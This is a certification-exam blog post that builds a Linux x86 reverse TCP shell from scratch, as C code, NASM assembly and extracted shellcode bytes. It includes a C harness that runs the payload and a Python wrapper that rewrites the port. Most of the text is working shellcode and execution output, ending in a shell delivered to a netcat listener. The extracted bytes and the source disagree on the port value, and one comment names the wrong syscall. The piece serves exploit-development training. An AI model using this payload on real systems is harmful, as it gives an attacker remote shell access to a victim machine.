# Reverse TCP Shell

<p style="text-align: justify;">Today, we will deal with the process of creating Reverse TCP Shell from scratch. As a rule, we distinguish between two types of shells that interest the pentester:</p>

- Bind TCP Shell
- Reverse TCP Shell

<p style="text-align: justify;">Reverse Shell consists of "sending" the shell, for example "/bin/sh" towards the listening attacker port. Unlike Bind Shell, we no longer need to bind on a port, listen on it and accept connections. All you need is a single sys_connect() syscall that does the same job connecting to, for example, listening netcat.</p>

First, we'll try to reproduce this behavior using a program written in C.

```c
#include <stdio.h>
#include <netinet/in.h>

// change the trget here
#define TARGET "127.0.0.1"
// Change the correct port here
#define PORT 4444

int main(int argc, char **argv)
{	
	// sys_socket()	
	int reverse_socket = socket(AF_INET, SOCK_STREAM, 0);
	
	// sys_connect()
	struct sockaddr_in address;
	
	address.sin_addr.s_addr = inet_addr(TARGET);
	address.sin_port = htons(PORT);
	address.sin_family = AF_INET;

	connect(reverse_socket,(struct sockaddr *)&address, sizeof(address));

	
	// sys_dup2()
	dup2(reverse_socket,2);	// STDERR
	dup2(reverse_socket,1);	// STDOUT
	dup2(reverse_socket,0);	// STDIN
	
	// sys_execve()
	execve("/bin/sh",NULL,NULL);
	
	return 0;
}
```
Let's compile and execute it.
```sh
$ gcc reverse_shell.c -o reverse_shell
$ ./reverse_shell
```
Second terminal:
```sh
$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 45823)
uname -a
Linux ubuntu 3.5.0-51-generic #76-Ubuntu SMP Thu May 15 21:19:44 UTC 2014 i686 i686 i686 GNU/Linux
```
<p style="text-align: justify;">Perfectly, at the time of shellcode execution, the listening port receives a reverse shell. As we can see, in order to create a properly working program, it is necessary to use several so-called system calls. In this case, they are:</p>

- sys_socket()
- sys_connect()
- sys_dup2()
- sys_execve()

<p style="text-align: justify;">They are responsible for the whole process that the computer must perform to finally end with the shell sent to the address and port of the listening attacker.</p>

<p style="text-align: justify;">So let's start creating our shellcode using NASM. I will try to divide this process into parts, distinguishing between different system calls called in the course.</p>

### Clearing ###
<p style="text-align: justify;">First, we will start by clearing the registers we use, because in the case of the C language wrapper that we will be using, it may turn out to be very important (registers are not empty at the time of transition to the _start function).</p>

```nasm
global _start

section .text
_start:

cleaning:
	; cleaning all registers for further usage
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
```

### sys_socket() ###
<p style="text-align: justify;">Then, we proceed to create the socket. For this purpose, we will use socketcall() syscall, which will allow us to easily call subsequent types of system calls (socket, bind, listen ....). At this point I would like to explain the principle of system calls. Their list, in the case of systems based on intel x86 processors, can be found in the file:</p>

- /usr/include/i386-linux-gnu/asm/unistd_32.h

<p style="text-align: justify;">Each call system has its own identifier, which if you want to call directly describes it. For example, socketcall () has the identifier 102, which can be easily checked by grepping its name.</p>

```sh
$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socketcall
#define __NR_socketcall 102
```
<p style="text-align: justify;">In addition, in order to call the system call, in most cases you will need to set the appropriate arguments (system calls should be treated as a function) in the correct registers and order.</p>

<p style="text-align: justify;">Processor registers can be used as "containers" for arguments. In the case of system calls, it looks like this:</p>

- EAX is responsible for the system call identifier
- EBX holds the first argument
- ECX holds the second argument
- EDX stores the third argument
- ESI stores the fourth argument
- EDI stores the fifth argument

<p style="text-align: justify;">Situations where more than five arguments should be used fall outside the scope of this article.</p>

<p style="text-align: justify;">In the case of socketcall() syscall, the situation looks slightly different. Due to the fact that other types of system calls will be called with it, the arguments describing these types must be placed in the reverse order (!) On the stack, and then the ECX register (second argument) must point to the top of the stack, in such way that the processor can easily get to the called syscall arguments.</p>

<p style="text-align: justify;">So we know that there must be 102 in the EAX registry. How do you know what further arguments are required? In most cases, use the man command.</p>

```sh
$ man 2 socketcall
SOCKETCALL(2)              Linux Programmer's Manual             SOCKETCALL(2)

NAME
       socketcall - socket system calls

SYNOPSIS
       int socketcall(int call, unsigned long *args);

DESCRIPTION
       socketcall()  is  a  common  kernel  entry  point for the socket system
       calls.  call determines which socket function to invoke.   args  points
       to a block containing the actual arguments, which are passed through to
       the appropriate call.
```
<p style="text-align: justify;">We see, therefore, that this syscall accepts two arguments. The first is socket function to invoke (for example, sys_socket()), the second indicates the arguments of this function (top of the stack in ECX).</p>

<p style="text-align: justify;">The first function we call is sys_socket. Let's check its unique identifier. For "minor" syscalls called by socketcall(), their list is in the file:</p>

- /usr/include/linux/net.h

```sh
$ cat /usr/include/linux/net.h | grep sys_socket
#define SYS_SOCKET	1		/* sys_socket(2)		
```
Identifier is 1, let's check what arguments are expected. 
```sh
$ man 2 socket | grep "int socket"
int socket(int domain, int type, int protocol);
```
<p style="text-align: justify;">In most cases, the man command accurately describes what each argument means and where we can find the values that describe it. If not, everything is in Google :)</p>

- AF_INET = 2 (PF_INET)

```sh
$ vim /usr/include/i386-linux-gnu/bits/socket.h +122

#define AF_INET    PF_INET

$ vim /usr/include/i386-linux-gnu/bits/socket.h +78

#define PF_INET         2       /* IP protocol family
```
- SOCK_STREAM = 1

```sh
$ vim /usr/include/i386-linux-gnu/bits/socket.h +42

SOCK_STREAM = 1,              /* Sequenced, reliable, connection-based byte streams.  */
```
- IPPROTO_IP = 0

```sh
$ vim /usr/include/netinet/in.h + 34

IPPROTO_IP = 0,        /* Dummy protocol for TCP.  */
```
<p style="text-align: justify;">These arguments must be thrown in the reverse order due to the specifics of the stack.</p>

Let's move to the NASM code:
```nasm
sys_socket:
	; {C code} --> int reverse_socket = socket(AF_INET, SOCK_STREAM, 0);
	
	; syscall definition
	mov al, 102 		; syscall - socketcall
	mov bl, 1		; socketcall type - sys_socket

	; pushing the sys_socket atributes in reverse order (AF_INET, SOCK_STREAM, IPPROTO_IP)
	xor esi, esi		
	push esi		; IPPROTO_IP = 0 (null)
	push 1			; SOCK_STREAM = 1
	push 2			; AF_INET = 2 (PF_INET)

	mov ecx, esp 		; directing the stack pointer to sys_socket() function arguments

	int 128			; syscall execution

	mov edx, eax		; saving the reverse_socket pointer for further usage
```

### sys_connect() ###
<p style="text-align: justify;">The next call system will be sys_connect. The whole process looks very similar, except that we have here "throwing" arguments to the stack and indicating their top to the ECX register twice.</p>

We check the system call identifier:
```sh
$ cat /usr/include/linux/net.h | grep sys_connect
#define SYS_CONNECT	3		/* sys_connect(2)
```
And also the structure of the expected arguments:
```sh
$ man 2 connect | grep "int connect"
int connect(int sockfd, const struct sockaddr *addr,
                   socklen_t addrlen);
```
NASM code:
```nasm
sys_connect:
	; {C code} --> struct sockaddr_in address;
        ; {C code} --> address.sin_addr.s_addr = inet_addr(TARGET);
        ; {C code} --> address.sin_port = htons(PORT);
        ; {C code} --> address.sin_family = AF_INET;
	; {C code} --> connect(reverse_socket,(struct sockaddr *)&address, sizeof(address));

	; syscall definition
	mov al, 102		; syscall - socketcall
	mov bl, 3		; socketcall type - sys_connect

	; pushing the address struct arguments
	push esi		; pushing 0 (null)
	mov ecx, 0x06050584	; moving the 127.0.0.1 address into ECX (reverse order, becouse of nulls, we have to add value 5 in every place...
	sub ecx, 0x05050505	; ... and then substract value 5 from every place
	push ecx		; pushing TARGET address to the stack
	push word 0x5c11	; PORT = 4444 (change reverse hex value for different port)
	push word 2		; AF_INET = 2
	mov ecx, esp		; directing the stack pointer to address struct arguments
	
	; pushing the sys_connect arguments in reverse order (int reverse_socket, const struct sockaddr *addr, socklen_t addrlen) 
	push 16			; socklen_t addrlen (size) = 16
	push ecx		; const struct sockaddr *addr - stack pointer with struct arguments	
	push edx		; reverse_socket pointer

	mov ecx, esp		; directing the stack pointer to sys_bind() function arguments

	int 128			; syscall execution
```

### sys_dup2() ###
<p style="text-align: justify;">Another syscall, sys_dup2() can be implemented in many ways, for example by using loops. I decided to do it step by step in order to better illustrate the arguments raised. It is worth noting that it is not called from socketcall(), but directly as system syscall.</p>

We check the system call identifier:
```sh
$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2
#define __NR_dup2 63
```
And also the structure of the expected arguments:
```sh
$ man 2 dup2 | grep "int dup2"
int dup2(int oldfd, int newfd);
```
NASM code:
```nasm
sys_dup2:
	; {C code} --> dup2(sock,2);
        ; {C code} --> dup2(sock,1);
        ; {C code} --> dup2(sock,0);

	; syscall definition
	mov al, 63		; syscall - dup2
	
	mov ebx, edx		; overwriting the reverse_socket pointer
	xor ecx, ecx		; STDIN - 0 (null)

	int 128			; syscall execution

	; syscall definition
	mov al, 63		; syscall - dup2
	mov cl, 1		; STDOUT - 1
	
	int 128			; syscall execution

	; syscall definition
	mov al, 63		; syscall - dup2
	mov cl, 2		; STDERR - 2

	int 128			; syscall execution
```

### sys_execve() ###
<p style="text-align: justify;">The last syscall we call will be sys_execve. In this case we see the placement of the string "/bin/sh" + string terminator "\x00" in the EBX registry, using a stack.</p>

<p style="text-align: justify;">After doing this, syscall establishes a connection using configured address and port sending a "/bin/sh" shell.</p>

We check the system call identifier:
```sh
$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve
#define __NR_execve 11
```
And also the structure of the expected arguments:
```sh
$ man 2 execve | grep "int execve"
int execve(const char *filename, char *const argv[],
                  char *const envp[]);
```
NASM code:
```nasm
sys_execve:
	; {C code} --> execve("/bin/sh",NULL,NULL);

	; syscall definition
	mov al, 11		; syscall - execve

	; pushing the sys_execve string argument
	xor esi, esi
	push esi		; pushing 0 (null)

	push 0x68732f6e		; pushing "n/sh"
	push 0x69622f2f		; pushing "//bi"

        ; pushing the sys_execve arguments (const char *filename, char *const argv[], char *const envp[])
	mov ebx, esp		; directing the stack pointer to sys_execve() string argument
	xor ecx, ecx		; char *const envp[] = 0 (null)
	xor edx, edx		; char *const argv[] = 0 (null)

	int 128			; syscall execution
```
---------------------------------------------------------------------------

### reverse_shell.nasm ###
<p style="text-align: justify;">That's all, below I present the entire code of the NASM file, which we will then put into the C language wrapper and try to execute.</p>

```nasm
; Filename: reverse_shell.nasm
; Author:   Jakub Heba
; Purpose:  SLAE Course & Exam

global _start			

; Header Files:
; -------------------------------------------------------------------------------------------------------
; |  Linux Syscall description file path: 		|  /usr/include/i386-linux-gnu/asm/unistd_32.h  |
; |  Linux Socketcall numbers:				|  /usr/include/linux/net.h		|
; |  Linux IP Protocols Declarations:			|  /usr/include/netinet/in.h		|
; |  Linux System-specific socket constants and types:	|  /usr/include/i386-linux-gnu/bits/socket.h	|
; -------------------------------------------------------------------------------------------------------

section .text
_start:

cleaning:
	; cleaning all registers for further usage
  xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

sys_socket:
	; {C code} --> int reverse_socket = socket(AF_INET, SOCK_STREAM, 0);
	
	; syscall definition
	mov al, 102 		; syscall - socketcall
	mov bl, 1		; socketcall type - sys_socket

	; pushing the sys_socket atributes in reverse order (AF_INET, SOCK_STREAM, IPPROTO_IP)
	xor esi, esi		
	push esi		; IPPROTO_IP = 0 (null)
	push 1			; SOCK_STREAM = 1
	push 2			; AF_INET = 2 (PF_INET)

	mov ecx, esp 		; directing the stack pointer to sys_socket() function arguments

	int 128			; syscall execution

	mov edx, eax		; saving the reverse_socket pointer for further usage

sys_connect:
	; {C code} --> struct sockaddr_in address;
        ; {C code} --> address.sin_addr.s_addr = inet_addr(TARGET);
        ; {C code} --> address.sin_port = htons(PORT);
        ; {C code} --> address.sin_family = AF_INET;
	; {C code} --> connect(reverse_socket,(struct sockaddr *)&address, sizeof(address));

	; syscall definition
	mov al, 102		; syscall - socketcall
	mov bl, 3		; socketcall type - sys_connect

	; pushing the address struct arguments
	push esi		; pushing 0 (null)
	mov ecx, 0x06050584	; moving the 127.0.0.1 address into ECX (reverse order, becouse of nulls, we have to add value 5 in every place...
	sub ecx, 0x05050505	; ... and then substract value 5 from every place
	push ecx		; pushing TARGET address to the stack
	push word 0x5c11	; PORT = 4444 (change reverse hex value for different port)
	push word 2		; AF_INET = 2
	mov ecx, esp		; directing the stack pointer to address struct arguments
	
	; pushing the sys_connect arguments in reverse order (int reverse_socket, const struct sockaddr *addr, socklen_t addrlen) 
	push 16			; socklen_t addrlen (size) = 16
	push ecx		; const struct sockaddr *addr - stack pointer with struct arguments	
	push edx		; reverse_socket pointer

	mov ecx, esp		; directing the stack pointer to sys_bind() function arguments

	int 128			; syscall execution
	
sys_dup2:
	; {C code} --> dup2(sock,2);
        ; {C code} --> dup2(sock,1);
        ; {C code} --> dup2(sock,0);

	; syscall definition
	mov al, 63		; syscall - dup2
	
	mov ebx, edx		; overwriting the reverse_socket pointer
	xor ecx, ecx		; STDIN - 0 (null)

	int 128			; syscall execution

	; syscall definition
	mov al, 63		; syscall - dup2
	mov cl, 1		; STDOUT - 1
	
	int 128			; syscall execution

	; syscall definition
	mov al, 63		; syscall - dup2
	mov cl, 2		; STDERR - 2

	int 128			; syscall execution

sys_execve:
	; {C code} --> execve("/bin/sh",NULL,NULL);

	; syscall definition
	mov al, 11		; syscall - execve

	; pushing the sys_execve string argument
	xor esi, esi
	push esi		; pushing 0 (null)

	push 0x68732f6e		; pushing "n/sh"
	push 0x69622f2f		; pushing "//bi"

        ; pushing the sys_execve arguments (const char *filename, char *const argv[], char *const envp[])
	mov ebx, esp		; directing the stack pointer to sys_execve() string argument
	xor ecx, ecx		; char *const envp[] = 0 (null)
	xor edx, edx		; char *const argv[] = 0 (null)

	int 128			; syscall execution
```

### Assemble and linking ###

Let's use scripts provided by Vivec in SLAE course materials.
```sh
$ cat ./compile.sh 

#!/bin/bash
echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm
echo '[+] Linking ...'
ld -o $1 $1.o
echo '[+] Done!'

$ ./compile.sh reverse_shell
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
```

### Preparing C Wrapper ###

<p style="text-align: justify;">Now we extract the shellcode from our NASM and put it in the C language wrapper. It's also worth checking to see if any null-byte has crept in.</p>

```sh
$ objdump -d ./reverse_shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x03\x56\xb9\x84\x05\x05\x06\x81\xe9\x05\x05\x05\x05\x51\x66\x68\x0d\x05\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
```
Then we have to copy it inside shellcode.c wrapper file:
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x03\x56\xb9\x84\x05\x05\x06\x81\xe9\x05\x05\x05\x05\x51\x66\x68\x0d\x05\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```

And compile.
```sh
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

### Python port wrapper ###

<p style="text-align: justify;">A very nice improvement is to write a wrapper that will allow us to quickly change the port, where TCP Reverse Shell should run. The port will always be a maximum of two bytes, regardless of whether it is port 1 ("\x01") or 65535 ("\xff\xff"). Therefore, we can use a simple trick to replace port 4444, indicated by us in NASM ("\x11\x5c"), with the port indicated as argument.</p>

```python
#/usr/bin/python3
import sys

# We want to produce a shellcode, which has included port specified by us.
# We are replacing \x11\x5c then, which was the original port putted inside (4444)
shellcode = r'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x03\x56\xb9\x84\x05\x05\x06\x81\xe9\x05\x05\x05\x05\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80'
port = int(sys.argv[1])

print("\nPort specified:  ",port,'\n',30*'-','\n')
hexed = hex(port).replace('0x','')

if len(hexed) == 1:
	fin = ('\\x0'+hexed)
elif len(hexed) == 2:
	fin = ('\\x'+hexed)
elif len(hexed) == 3:
	fin = ('\\x0'+hexed[0]+'\\x'+hexed[1:3])
elif len(hexed) ==4:
	fin = ('\\x'+hexed[:2]+'\\x'+hexed[2:4])

print("Port in hex:     ",fin,'\n',30*'-','\n')
final = shellcode.replace("\\x11\\x5c",fin)
print("Final shellcode:  \""+str(final)+'"','\n')
```
Usage:
```sh
$ python3 wrapper.py 9090

Port specified:   9090
 ------------------------------

Port in hex:      \x23\x82
 ------------------------------

Final shellcode:  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x03\x56\xb9\x84\x05\x05\x06\x81\xe9\x05\x05\x05\x05\x51\x66\x68\x23\x82\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
```

### Execution ###

```sh
$ ./shellcode
Shellcode Length: 102
```
Great! Now we have to listen on port 4444 as attacker. 

```
$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 48042)
uname -a
Linux ubuntu 3.5.0-51-generic #76-Ubuntu SMP Thu May 15 21:19:44 UTC 2014 i686 i686 i686 GNU/Linux

```

### Pwned. ###

-----------------------------------------------------------------------------
-----------------------------------------------------------------------------

<p style="text-align: justify;">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: https://www.pentesteracademy.com/course?id=3</p>

Student ID: SLAE-1524

-----------------------------------------------------------------------------
-----------------------------------------------------------------------------
